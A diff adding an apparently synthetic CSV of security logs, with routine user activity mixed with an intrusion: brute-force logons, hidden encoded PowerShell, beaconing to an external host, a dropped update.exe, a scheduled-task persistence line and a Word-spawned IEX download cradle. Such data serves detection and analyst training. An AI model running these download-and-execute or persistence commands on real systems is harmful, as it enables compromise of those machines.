@@ -1,0 +1,131 @@
+timestamp,username,source_ip,destination_ip,destination_port,event_type,action,status,hostname,process,command_line,file_hash,message
+2026-09-14 03:12:40,bob,203.0.113.77,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon from previously unseen source
+2026-09-14 03:14:05,bob,203.0.113.77,,,PROCESS,process_start,EXECUTED,SRV-APP01,cmd.exe,cmd.exe /c whoami /all,,Spawned whoami.exe
+2026-09-14 03:15:20,bob,203.0.113.77,,,PROCESS,process_start,EXECUTED,SRV-APP01,cmd.exe,cmd.exe /c net user,,Spawned net.exe
+2026-09-14 03:16:33,bob,203.0.113.77,,,PROCESS,process_start,EXECUTED,SRV-APP01,cmd.exe,cmd.exe /c ipconfig /all,,Spawned ipconfig.exe
+2026-09-14 08:35:29,carol,10.0.1.23,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 08:36:08,carol,10.0.1.23,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:40:17,bob,10.0.1.22,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 08:40:57,bob,10.0.1.22,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:50:07,alice,10.0.1.21,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 08:50:25,alice,10.0.1.21,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:57:07,dave,10.0.1.24,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 08:57:22,dave,10.0.1.24,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 09:04:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,excel.exe,,,excel.exe started
+2026-09-14 09:07:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,chrome.exe,,,chrome.exe started
+2026-09-14 09:13:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,teams.exe,,,teams.exe started
+2026-09-14 09:14:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,teams.exe,,,teams.exe started
+2026-09-14 09:20:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 09:27:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,excel.exe,,,excel.exe started
+2026-09-14 09:32:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 09:43:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 09:44:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,excel.exe,,,excel.exe started
+2026-09-14 09:49:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,outlook.exe,,,outlook.exe started
+2026-09-14 09:54:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,excel.exe,,,excel.exe started
+2026-09-14 09:59:08,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:04:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,excel.exe,,,excel.exe started
+2026-09-14 10:06:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,chrome.exe,,,chrome.exe started
+2026-09-14 10:12:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,winword.exe,,,winword.exe started
+2026-09-14 10:15:00,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:07,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:18,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:28,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:36,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:43,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:15:53,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:04,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:15,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:25,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:32,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:41,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:49,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:16:59,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:08,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:18,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:28,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:34,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:45,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:17:55,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:05,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:15,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:26,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:36,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:43,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:18:54,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:19:03,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:19:12,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:19:19,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:19:29,svc_backup,192.168.1.77,10.0.0.20,,LOGIN,authentication,FAILED,SRV-FILE01,,,,Invalid credentials
+2026-09-14 10:29:12,admin,10.0.0.99,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 10:30:05,admin,10.0.0.99,,,PROCESS,process_start,EXECUTED,SRV-APP01,powershell.exe,powershell.exe Get-Service | Where-Object Status -eq Running,,Routine service check
+2026-09-14 10:30:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,winword.exe,,,winword.exe started
+2026-09-14 10:33:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:38:08,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:38:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,chrome.exe,,,chrome.exe started
+2026-09-14 10:43:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:43:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:44:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,winword.exe,,,winword.exe started
+2026-09-14 11:01:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,excel.exe,,,excel.exe started
+2026-09-14 11:04:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:13:25,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,winword.exe,,,winword.exe started
+2026-09-14 11:20:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:21:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:29:08,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:33:25,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:36:25,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:44:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,excel.exe,,,excel.exe started
+2026-09-14 11:48:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,teams.exe,,,teams.exe started
+2026-09-14 11:49:25,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:57:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,teams.exe,,,teams.exe started
+2026-09-14 12:01:00,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,outlook.exe,,,outlook.exe started
+2026-09-14 12:01:10,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:18,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:28,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:34,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:40,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:48,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:01:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,outlook.exe,,,outlook.exe started
+2026-09-14 12:01:58,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:08,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:16,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:24,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:31,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:39,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:46,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:53,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:02:59,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:10,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:19,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:27,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:34,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:43,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:03:53,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:04:02,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:04:11,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:04:20,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 12:04:51,admin,192.168.1.50,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon after repeated failures
+2026-09-14 12:07:05,admin,192.168.1.50,,,PROCESS,process_start,EXECUTED,SRV-APP01,powershell.exe,powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAaQBtAHUAbABhAHQAZQBkACAAYgBlAG4AaQBnAG4AIABwAGEAeQBsAG8AYQBkACcA,,Encoded PowerShell command
+2026-09-14 12:08:10,admin,192.168.1.50,,,PROCESS,process_start,EXECUTED,SRV-APP01,cmd.exe,cmd.exe /c whoami /all,,Account discovery
+2026-09-14 12:09:20,admin,192.168.1.50,198.51.100.23,4444,NETWORK,connection,ALLOWED,SRV-APP01,powershell.exe,,,Outbound connection to external host
+2026-09-14 12:09:50,admin,192.168.1.50,,,FILE,file_create,SUCCESS,SRV-APP01,powershell.exe,C:\Users\Public\update.exe,c486287f52f83451d716e5ad079acc6f1ce3109269c80f8741ff5e8837e4215d,Executable written to public folder
+2026-09-14 12:10:20,admin,192.168.1.50,198.51.100.23,4444,NETWORK,connection,ALLOWED,SRV-APP01,update.exe,,,Repeated outbound connection (beaconing pattern)
+2026-09-14 12:11:20,admin,192.168.1.50,198.51.100.23,4444,NETWORK,connection,ALLOWED,SRV-APP01,update.exe,,,Repeated outbound connection (beaconing pattern)
+2026-09-14 12:12:15,admin,192.168.1.50,,,PROCESS,process_start,EXECUTED,SRV-APP01,schtasks.exe,schtasks /create /sc onlogon /tn Updater /tr C:\Users\Public\update.exe,,Scheduled task created
+2026-09-14 12:19:08,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 12:21:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 12:28:57,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,outlook.exe,,,outlook.exe started
+2026-09-14 12:32:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 12:56:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,winword.exe,,,winword.exe started
+2026-09-14 13:05:57,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:07:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:26:08,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:29:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:54:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,outlook.exe,,,outlook.exe started
+2026-09-14 14:04:22,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,outlook.exe,,,outlook.exe started
+2026-09-14 14:22:03,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAaQBtAHUAbABhAHQAZQBkACAAYgBlAG4AaQBnAG4AIABwAGEAeQBsAG8AYQBkACcA,,Parent process: winword.exe
+2026-09-14 14:23:10,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')""",,Parent process: winword.exe
+2026-09-14 14:24:02,carol,10.0.1.23,198.51.100.23,80,NETWORK,connection,ALLOWED,WS-CAROL,powershell.exe,,,Outbound HTTP connection
+2026-09-14 14:29:08,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 14:30:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 15:07:22,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
